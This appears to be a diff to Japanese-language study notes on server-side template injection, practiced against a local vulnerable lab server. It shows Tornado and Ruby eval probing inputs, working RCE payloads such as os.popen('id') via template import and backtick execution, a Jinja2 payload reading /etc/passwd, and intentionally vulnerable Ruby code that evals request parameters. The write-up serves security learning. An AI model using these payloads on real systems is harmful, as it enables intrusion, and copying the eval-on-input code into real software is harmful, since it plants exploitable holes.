@@ -478,7 +478,80 @@ http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].
 kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
 ```
 #### tornado
+```python
+    elif engine == 'tornado':
+        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
+```
+以下より、Jinja2と同じ感じに判定されてる？   
+```txt
+http://192.168.99.100:15001/reflect/tornado?inj=*
+fplhzbeq*qtimtyxd
+
+http://192.168.99.100:15001/reflect/tornado?inj=${7*7}
+rccnmdzh${7*7}nxqxuufh
+
+http://192.168.99.100:15001/reflect/tornado?inj={{7*7}}
+wvsgtaah49oplxnfgy
+
+http://192.168.99.100:15001/reflect/tornado?inj={{7*%277%27}}
+sgpjyjjx7777777ozfenemu
+```
+以下でRCE!   
+```txt
+http://192.168.99.100:15001/reflect/tornado?inj={%import%20os%}{{os.popen(%22id%22).read()}}
+rggolkqtuid=0(root) gid=0(root) groups=0(root) qtrhruyr
+```
 ### Ruby
+#### eval
+```ruby
+require "cuba"
+require "cuba/safe"
+
+require 'tilt'
+require 'slim'
+require 'erb'
+
+Cuba.plugin Cuba::Safe
+
+Cuba.define do
+  on get do
+    on "reflect/:engine" do |engine|
+      # Keep the formatting a-la-python
+      on param("inj"), param("tpl", "%s") do |inj, tpl|
+        
+        tpl = tpl.gsub('%s', inj)
+        
+        case engine
+        when "eval"
+          res.write eval(tpl)
+        when "slim"
+
+          template = Tilt['slim'].new() {|x| tpl}
+          res.write template.render
+        when "erb"
+          template = Tilt['erb'].new() {|x| tpl}
+          res.write template.render
+        else
+          res.write "#{engine} #{inj} #{tpl}" 
+        end
+        
+      end
+    end
+```
+`http://192.168.99.100:15005/reflect/eval?inj=*`で以下のようなエラー。   
+![image](https://user-images.githubusercontent.com/56021519/102784834-44be7580-43e0-11eb-8bdb-fa8be136cf23.png)   
+以下でRCEできる！systemを使うと実行自体はできているがTrueが返ってくる。バッククォートで挟めばシェルコマンドを実行できる！   
+```txt
+http://192.168.99.100:15005/reflect/eval?inj=system(%27id%27)
+true
+
+http://192.168.99.100:15005/reflect/eval?inj=`id`
+uid=0(root) gid=0(root) groups=0(root) 
+```
+#### slim
+
+#### erb
+
 ### Node.js
 
 # メモ
